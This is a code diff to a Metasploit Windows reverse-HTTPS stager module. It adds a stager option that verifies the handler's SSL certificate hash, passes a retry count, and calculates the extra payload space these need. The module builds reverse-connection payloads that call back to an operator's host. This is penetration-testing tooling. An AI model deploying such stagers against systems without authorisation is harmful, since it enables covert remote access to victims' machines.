@@ -2,6 +2,7 @@
 
 require 'msf/core'
 require 'msf/core/payload/windows/reverse_winhttp'
+require 'msf/core/payload/windows/verify_ssl'
 
 module Msf
 
@@ -16,6 +17,18 @@ module Msf
 module Payload::Windows::ReverseWinHttps
 
   include Msf::Payload::Windows::ReverseWinHttp
+  include Msf::Payload::Windows::VerifySsl
+
+  #
+  # Register reverse_winhttps specific options
+  #
+  def initialize(*args)
+    super
+    register_advanced_options(
+      [
+        OptBool.new('StagerVerifySSLCert', [false, 'Whether to verify the SSL certificate hash in the handler', false])
+      ], self.class)
+  end
 
   #
   # Generate and compile the stager
@@ -37,13 +50,23 @@ module Payload::Windows::ReverseWinHttps
   #
   def generate
 
+    verify_cert_hash = get_ssl_cert_hash(datastore['StagerVerifySSLCert'],
+                                         datastore['HandlerSSLCert'])
+
     # Generate the simple version of this stager if we don't have enough space
     if self.available_space.nil? || required_space > self.available_space
+
+      if verify_cert_hash
+        raise ArgumentError, "StagerVerifySSLCert is enabled but not enough payload space is available"
+      end
+
       return generate_reverse_winhttps(
         ssl:  true,
         host: datastore['LHOST'],
         port: datastore['LPORT'],
-        url:  generate_small_uri)
+        url:  generate_small_uri,
+        verify_cert_hash: verify_cert_hash,
+        retry_count: datastore['StagerRetryCount'])
     end
 
     conf = {
@@ -51,10 +74,29 @@ module Payload::Windows::ReverseWinHttps
       host: datastore['LHOST'],
       port: datastore['LPORT'],
       url:  generate_uri,
-      exitfunk: datastore['EXITFUNC']
+      exitfunk: datastore['EXITFUNC'],
+      verify_cert_hash: verify_cert_hash,
+      retry_count: datastore['StagerRetryCount']
     }
 
     generate_reverse_winhttps(conf)
+  end
+
+  #
+  # Determine the maximum amount of space required for the features requested
+  #
+  def required_space
+    space = super
+
+    # SSL support adds 20 bytes
+    space += 20
+
+    # SSL verification adds 120 bytes
+    if datastore['StagerVerifySSLCert']
+      space += 120
+    end
+
+    space
   end
 
 end
